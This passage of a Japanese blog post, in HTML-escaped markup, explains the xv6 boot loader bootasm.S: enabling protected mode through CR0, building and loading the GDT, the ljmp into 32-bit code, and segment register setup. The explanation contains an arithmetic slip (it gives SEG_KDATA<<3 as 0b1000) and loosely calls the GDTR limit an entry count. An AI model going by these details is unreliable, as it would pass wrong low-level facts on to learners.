
.code32  # Tell assembler to generate 32-bit code now.
start32:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;プロテクトモードへの移行自体は以下の行で行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;movl    %cr0, %eax
orl     $CR0_PE, %eax
movl    %eax, %cr0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;x86CPUでは、プロテクトモードを有効化するためにコントロールレジスタのPEフラグを1にする必要があります。&lt;/p&gt;
&lt;p&gt;上記のアセンブリコードでは、&lt;code class=&quot;language-text&quot;&gt;or&lt;/code&gt;演算を用いてコントロールレジスタのPEフラグを1に設定しています。&lt;/p&gt;
&lt;p&gt;これでプロテクトモードへの移行が完了します。&lt;/p&gt;
&lt;p&gt;※GDTの初期化を先に完了させておく必要があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Control_register&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Control register - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;プロテクトモードでのメモリアドレス参照&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A7%E3%81%AE%E3%83%A1%E3%83%A2%E3%83%AA%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E5%8F%82%E7%85%A7&quot; aria-label=&quot;プロテクトモードでのメモリアドレス参照 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロテクトモードでのメモリアドレス参照&lt;/h3&gt;
&lt;p&gt;プロテクトモードでは、メモリアドレスの参照のためにGDT(グローバルディスクリプタテーブル)が使用されます。&lt;/p&gt;
&lt;p&gt;GDT周りの機構については長くなったので別の記事にメモ書きとしてまとめました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/linux-got-plt&quot;&gt;x86CPUのメモリ保護機構に関するメモ書き(GDTとLDT)&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;lgdt-gdtdesc&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#lgdt-gdtdesc&quot; aria-label=&quot;lgdt gdtdesc permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;lgdt gdtdesc&lt;/h3&gt;
&lt;p&gt;まず、&lt;code class=&quot;language-text&quot;&gt;lgdt&lt;/code&gt;命令はGDTのデータ構造をGDTRに登録するための命令です。&lt;/p&gt;
&lt;p&gt;ここに格納している&lt;code class=&quot;language-text&quot;&gt;gdtdesc&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;bootasm.S&lt;/code&gt;内で定義された以下のラベルです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# Bootstrap GDT
.p2align 2                                # force 4 byte alignment
gdt:
  SEG_NULLASM                             # null seg
  SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)   # code seg
  SEG_ASM(STA_W, 0x0, 0xffffffff)         # data seg

gdtdesc:
  .word   (gdtdesc - gdt - 1)             # sizeof(gdt) - 1
  .long   gdt                             # address gdt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.p2align 2&lt;/code&gt;は、この直後の命令やデータを4バイト境界に強制的に配置させます。&lt;/p&gt;
&lt;p&gt;これは、4の倍数のアドレスを開始点としてデータを配置することを意味します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/2846914/what-is-meant-by-memory-is-8-bytes-aligned&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c - What is meant by “memory is 8 bytes aligned”? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;次の行では、&lt;code class=&quot;language-text&quot;&gt;SEG_NULLASM&lt;/code&gt;マクロなどが配置されている行に&lt;code class=&quot;language-text&quot;&gt;gtd&lt;/code&gt;ラベルを付けています。&lt;/p&gt;
&lt;p&gt;これらのマクロは、&lt;code class=&quot;language-text&quot;&gt;asm.h&lt;/code&gt;で定義されている以下のマクロです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;//
// assembler macros to create x86 segments
//

#define SEG_NULLASM                                             \
        .word 0, 0;                                             \
        .byte 0, 0, 0, 0

// The 0xC0 means the limit is in 4096-byte units
// and (for executable segments) 32-bit mode.
#define SEG_ASM(type,base,lim)                                  \
        .word (((lim) &amp;gt;&amp;gt; 12) &amp;amp; 0xffff), ((base) &amp;amp; 0xffff);      \
        .byte (((base) &amp;gt;&amp;gt; 16) &amp;amp; 0xff), (0x90 | (type)),         \
                (0xC0 | (((lim) &amp;gt;&amp;gt; 28) &amp;amp; 0xf)), (((base) &amp;gt;&amp;gt; 24) &amp;amp; 0xff)

#define STA_X     0x8       // Executable segment
#define STA_W     0x2       // Writeable (non-executable segments)
#define STA_R     0x2       // Readable (executable segments)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;x86CPUにおけるGDTは、基本的には8バイトのディスクリプタをいくつも並べた構造になっています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Global_Descriptor_Table&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Global Descriptor Table - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以下は、&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;で紹介されていたディスクリプタの構造体です。&lt;/p&gt;
&lt;p&gt;こちらの方がxv6OSのコードよりもわかりやすかったので貼っておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;SEGMENT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;short&lt;/span&gt; limit_low&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; base_low&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; base_mid&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; access_right&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; limit_high&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; base_high&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;GDTの先頭(1つ目のディスクリプタ)には、すべての値が0に設定されたヌルディスクリプタを配置します。&lt;/p&gt;
&lt;p&gt;これはシステムからは参照されることはありません。&lt;/p&gt;
&lt;p&gt;ヌルディスクリプタはセグメントレジスタを無効化するために使用されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/37861691/why-x86-processor-need-a-null-descriptor-in-gdt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Why x86 processor need a NULL descriptor in GDT? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2番目のディスクリプタはコードセグメント、3番目のディスクリプタはデータセグメントのディスクリプタを定義しています。&lt;/p&gt;
&lt;p&gt;コードセグメントは読み取りと実行、データセグメントは書き込み権限が付与されています。&lt;/p&gt;
&lt;p&gt;最後に、このマクロで作成したGDTのアドレスを使用して、&lt;code class=&quot;language-text&quot;&gt;lgdt gdtdesc&lt;/code&gt;命令によってGDTRを初期化します。&lt;/p&gt;
&lt;p&gt;GDTRには48bitの値を格納します。&lt;/p&gt;
&lt;p&gt;上位32bitには、GDTの先頭アドレス(gdtラベル)が格納されます。&lt;/p&gt;
&lt;p&gt;下位16bitには、リミット値(GDTのエントリ数)が格納されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://yz2cm.hatenadiary.org/entry/20140502/1399006500&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GDTR（Global Descriptor Table Register） - ゆずさん研究所&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;プログラムがLDTなどのディスクリプタを利用する際には、GDTRにセットされた先頭アドレスからのオフセットとして参照されることになります。&lt;/p&gt;
&lt;p&gt;これでGDTRの初期化が完了しました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/67901342/why-in-xv6-theres-sizeofgdt-1-in-gdtdesc&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;assembly - Why in xv6 there’s sizeof(gdt)-1 in gdtdesc - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://jupiteroak.hatenablog.com/entry/2021/12/10/073000&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;OS起動編⑮-2 entryother.S (Unix xv6を読む～OSコードリーディング～) - 野良プログラマーのCS日記&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;32bitモードの開始&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#32bit%E3%83%A2%E3%83%BC%E3%83%89%E3%81%AE%E9%96%8B%E5%A7%8B&quot; aria-label=&quot;32bitモードの開始 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;32bitモードの開始&lt;/h3&gt;
&lt;p&gt;GDTRの初期化とプロテクトモードへの移行が完了したため、ここからは32bitモードで動作することになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;//PAGEBREAK!
  # Complete the transition to 32-bit protected mode by using a long jmp
  # to reload %cs and %eip.  The segment descriptors are set up with no
  # translation, so that the mapping is still the identity mapping.
  ljmp    $(SEG_KCODE&amp;lt;&amp;lt;3), $start32

.code32  # Tell assembler to generate 32-bit code now.
start32:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ljmp&lt;/code&gt;命令は第1オペランドにセグメントセレクタをとり、第2オペランドにオフセットアドレス(&lt;code class=&quot;language-text&quot;&gt;start32&lt;/code&gt;ラベル)を与えることで、セレクタに対応するセグメントベース+オフセットのアドレスにジャンプする命令です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;SEG_KCODE&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;mmu.h&lt;/code&gt;内で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// various segment selectors.&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;SEG_KCODE&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// kernel code&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;SEG_KDATA&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// kernel data+stack&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;SEG_UCODE&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// user code&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;SEG_UDATA&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// user data+stack&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;SEG_TSS&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// this process&apos;s task state&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記より、&lt;code class=&quot;language-text&quot;&gt;$(SEG_KCODE&amp;lt;&amp;lt;3)&lt;/code&gt;が定義するセグメントセレクタは、&lt;code class=&quot;language-text&quot;&gt;0b1000&lt;/code&gt;となります。&lt;/p&gt;
&lt;p&gt;これは、GDTの2つ目のセグメントであるコードセグメントを指します。&lt;/p&gt;
&lt;p&gt;セグメントセレクタは、以下のページの通り16bitで構成され、上位13bitにはディスクリプタのインデックス(GDTの先頭からのインデックス)が定義され、下位3bitにはテーブルインジゲータ(TI)と要求特権レベル(RPL)が定義されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://yz2cm.hatenadiary.org/entry/20140502/1399012324&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;セグメント・セレクタ - ゆずさん研究所&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;TIが0の場合、GDTを参照します。(1の場合はLDTを参照)&lt;/p&gt;
&lt;p&gt;また、RPLが0の場合は、特権アクセスを意味します。&lt;/p&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;$(SEG_KCODE&amp;lt;&amp;lt;3)&lt;/code&gt;が定義するセグメントセレクタ&lt;code class=&quot;language-text&quot;&gt;0b1000&lt;/code&gt;は、インデックスが1、TIが0、RPLが0と定義されたセグメントレジスタになります。&lt;/p&gt;
&lt;h3 id=&quot;なぜljmp命令を使用するのか&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%AA%E3%81%9Cljmp%E5%91%BD%E4%BB%A4%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E3%81%AE%E3%81%8B&quot; aria-label=&quot;なぜljmp命令を使用するのか permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;なぜljmp命令を使用するのか&lt;/h3&gt;
&lt;p&gt;このコードには少し違和感がありました。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;%cr0&lt;/code&gt;の設定が完了してプロテクトモードに移行するところまで処理を進めた場合、わざわざ&lt;code class=&quot;language-text&quot;&gt;ljmp&lt;/code&gt;命令を呼び出さなくても&lt;code class=&quot;language-text&quot;&gt;start32&lt;/code&gt;の処理が呼び出されるはずです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;  lgdt    gdtdesc
  movl    %cr0, %eax
  orl     $CR0_PE, %eax
  movl    %eax, %cr0
  ljmp    $(SEG_KCODE&amp;lt;&amp;lt;3), $start32

.code32  # Tell assembler to generate 32-bit code now.
start32:
{{ 省略 }}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここでわざわざ&lt;code class=&quot;language-text&quot;&gt;ljmp&lt;/code&gt;命令を使用しているのは、リアルモードで動作していた際にCPUが高速化のためにメモリから先読みした命令を破棄するためです。&lt;/p&gt;
&lt;p&gt;CPUには命令を高速に実行するためにパイプラインという仕組みがあり、これによって次の命令を先読みしています。&lt;/p&gt;
&lt;p&gt;しかし、プロテクトモードに移行するとリアルモードとは機械語の解釈が変わるため、これをリセットする必要がありまし。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ljmp&lt;/code&gt;命令を呼び出すことで、&lt;code class=&quot;language-text&quot;&gt;cs&lt;/code&gt;レジスタや&lt;code class=&quot;language-text&quot;&gt;eip&lt;/code&gt;レジスタの値がリロードされます。&lt;/p&gt;
&lt;h3 id=&quot;プロテクトモード移行後の設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89%E7%A7%BB%E8%A1%8C%E5%BE%8C%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;プロテクトモード移行後の設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロテクトモード移行後の設定&lt;/h3&gt;
&lt;p&gt;あと少しで&lt;code class=&quot;language-text&quot;&gt;bootasm.S&lt;/code&gt;の処理をすべて追うことができます。&lt;/p&gt;
&lt;p&gt;最後に見るのは以下の挙動です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;.code32  # Tell assembler to generate 32-bit code now.
start32:
  # Set up the protected-mode data segment registers
  movw    $(SEG_KDATA&amp;lt;&amp;lt;3), %ax    # Our data segment selector
  movw    %ax, %ds                # -&amp;gt; DS: Data Segment
  movw    %ax, %es                # -&amp;gt; ES: Extra Segment
  movw    %ax, %ss                # -&amp;gt; SS: Stack Segment
  movw    $0, %ax                 # Zero segments not ready for use
  movw    %ax, %fs                # -&amp;gt; FS
  movw    %ax, %gs                # -&amp;gt; GS

  # Set up the stack pointer and call into C.
  movl    $start, %esp
  call    bootmain

  # If bootmain returns (it shouldn&amp;#39;t), trigger a Bochs
  # breakpoint if running under Bochs, then loop.
  movw    $0x8a00, %ax            # 0x8a00 -&amp;gt; port 0x8a00
  movw    %ax, %dx
  outw    %ax, %dx
  movw    $0x8ae0, %ax            # 0x8ae0 -&amp;gt; port 0x8a00
  outw    %ax, %dx
spin:
  jmp     spin&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;セグメントレジスタの初期化-1&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%BB%E3%82%B0%E3%83%A1%E3%83%B3%E3%83%88%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96-1&quot; aria-label=&quot;セグメントレジスタの初期化 1 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;セグメントレジスタの初期化&lt;/h3&gt;
&lt;p&gt;ここでは、CS以外のセグメントレジスタの初期化を行っています。&lt;/p&gt;
&lt;p&gt;リアルモードからプロテクトモードに移行したことで、セグメントセレクタの用法が変わりました。&lt;/p&gt;
&lt;p&gt;具体的には、リアルモードではメモリアドレスを参照する場合に、セグメント部を16倍してオフセットに加算する方式を取っていたものが、プロテクトモードではセグメントディスクリプタの参照に変わります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://atmarkit.itmedia.co.jp/icd/root/02/5785802.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Insider’s Computer Dictionary：8086 とは？ - ＠IT&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そのため、プロテクトモードではセグメントレジスタにはセグメントセレクタを格納する必要があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;start32:
  # Set up the protected-mode data segment registers
  movw    $(SEG_KDATA&amp;lt;&amp;lt;3), %ax    # Our data segment selector
  movw    %ax, %ds                # -&amp;gt; DS: Data Segment
  movw    %ax, %es                # -&amp;gt; ES: Extra Segment
  movw    %ax, %ss                # -&amp;gt; SS: Stack Segment
  
  movw    $0, %ax                 # Zero segments not ready for use
  movw    %ax, %fs                # -&amp;gt; FS
  movw    %ax, %gs                # -&amp;gt; GS&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;セグメントセレクタは&lt;code class=&quot;language-text&quot;&gt;$(SEG_KDATA&amp;lt;&amp;lt;3)&lt;/code&gt;で設定されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;SEG_KDATA&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;mmu.h&lt;/code&gt;内で2と定義されていました。&lt;/p&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;$(SEG_KDATA&amp;lt;&amp;lt;3)&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;0b1000&lt;/code&gt;となります。&lt;/p&gt;
&lt;p&gt;これは、GDTの3番目に定義したセグメントディスクリプタ&lt;code class=&quot;language-text&quot;&gt;SEG_ASM(STA_W, 0x0, 0xffffffff)&lt;/code&gt;を指定するセレクタになります。&lt;/p&gt;
&lt;p&gt;これらの値を用いて、DS、ES、SSの各セグメントレジスタを初期化しています。&lt;/p&gt;
&lt;p&gt;また、FSとGSには0を格納しています。&lt;/p&gt;
&lt;p&gt;セグメントセレクタが0の場合、セグメントレジスタは無効化されます。&lt;/p&gt;
